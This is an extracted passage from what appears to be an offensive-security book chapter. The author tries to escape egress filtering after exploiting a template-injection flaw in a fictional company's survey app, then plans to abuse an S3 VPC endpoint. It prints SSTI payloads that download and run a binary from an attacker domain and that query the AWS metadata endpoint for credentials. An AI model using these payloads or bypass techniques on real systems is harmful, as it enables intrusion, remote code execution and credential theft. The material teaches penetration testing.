- pgno: 115
  md: '# Smuggling Buckets


    Now, we want nothing more than to drop a reverse shell and quietly sip a cup of
    coffee while some post-exploit plug-in sifts through gigabytes of data looking
    for passwords, secrets, and other gems. But life doesn''t always cooperate.


    When we try loading any file from the custom domain we created in Chapter 3 as
    part of our attacking infrastructure, the request never makes it home:


    ```

    # Payload


    email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()[282]["wget
    https://linux-packets-archive.com/runccd; chmod +x runccd; ./runccd&", shell=True,
    stdout=-1).communicate()[0]}}...


    <empty>

    ```


    Some sort of filter seems to block HTTP requests going to the outside world. Fair
    enough. We''ll try going in the opposite direction and query the metadata API
    169.254.169.254. This default AWS endpoint helped us glean much information on
    the demo app in Chapter 5. Hopefully, it will give us more credentials to play
    with . . . or not:


    ```

    # Payload


    email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()[282]["curl
    http://169.254.169.254/latest", shell=True, stdout=-1).communicate()[0]}}...


    <empty>

    ```


    Unfortunately, every time we exploit this SSTI vulnerability, we''re triggering
    emails carrying the command''s output. Not exactly a stealthy attack vector. MXR
    Ads sure did a good job locking its egress traffic. Though this a common security
    recommendation, very few companies actually dare to implement traffic filtering
    systematically on its machines, mainly because it requires a heavy setup to handle
    a few legitimate edge cases, such as checking updates and downloading new packages.
    The mxrads-dl bucket we came across in Chapter 5 makes total sense now: it must
    act like a local repository mirroring all public packages needed by servers. Not
    an easy environment to maintain, but it pays off in situations like this one.


    One question, though: how does MXR Ads explicitly allow traffic to the mxrads-dl
    bucket? Security groups (AWS Firewall rules) are layer 4 components that only
    understand IP addresses, which in the case of an S3 bucket may change, depending
    on many factors. So how can the surveysandstats.com website still reach the mxrads-dl
    bucket, yet fail to send packets to the rest of the internet?


    One possible solution is to whitelist all of S3''s IP range in a given region,
    like 52.218.0.0/17, 54.231.128.0/19, and so on. However, this method is ugly,
    flaky at best, and barely gets the job done.'
  merge: -1
  img_proc: true
- pgno: 116
  md: "A more scalable and cloud-friendly approach is to create an S3 VPC endpoint\
    \ (see https://docs.aws.amazon.com/glue/latest/dg/vpc-endpoints-s3.html for details).\
    \ It's simpler than it sounds: a *virtual private cloud (VPC)*, is an isolated\
    \ private network from which companies run their machines. It can be broken into\
    \ many subnets, just like any regular router interface. AWS can plug a special\
    \ endpoint URL into that VPC that will route traffic to its core services, like\
    \ S3. Instead of going through the internet to reach S3, machines on that VPC\
    \ will contact that special URL, which channels traffic through Amazon's internal\
    \ network to reach S3. That way, rather than whitelisting external IPs, one can\
    \ simply whitelist the VPC's internal range (10.0.0.0/8), thus avoiding any security\
    \ issues.\n\nThe devil is in the details, though, as a VPC endpoint is only ever\
    \ aware of the AWS service the machine is trying to reach. It does not care about\
    \ the bucket or the file it is looking for. The bucket could even belong to another\
    \ AWS account, and the traffic would still flow through the VPC endpoint to its\
    \ destination! So technically, even though MXR Ads seemingly sealed off the survey\
    \ app from the internet, we could still smuggle in a request to a bucket in our\
    \ own AWS account and get the app to run a file we control. Let's test this theory.\n\
    \nWe'll upload a dummy HTML file named *beaconTest.html* to one of our buckets\
    \ and make it public by granting *GetObject* permission to everyone.\n\nWe first\
    \ create a bucket called mxrads-archives-packets-linux:\n\n```\n```bash\nroot@Point1:~#\
